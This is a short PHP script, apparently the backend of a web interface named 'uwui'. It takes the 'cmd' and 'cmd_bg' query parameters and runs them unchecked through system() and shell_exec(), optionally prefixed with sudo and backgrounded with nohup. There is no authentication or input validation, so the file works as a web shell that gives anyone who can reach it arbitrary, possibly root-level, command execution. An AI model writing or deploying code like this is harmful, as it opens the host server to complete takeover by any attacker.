<?php
	include "uwui_vars.php";

	if ( isset($_GET["cmd"]) ) {
		echo "$_GET[cmd]\n";
		system("${sudo}$_GET[cmd] 2>&1");
	}
	if ( isset($_GET["cmd_bg"]) ) {
		echo "$_GET[cmd_bg]\n";
		shell_exec("${sudo}nohup $_GET[cmd_bg] &");
	}
?>
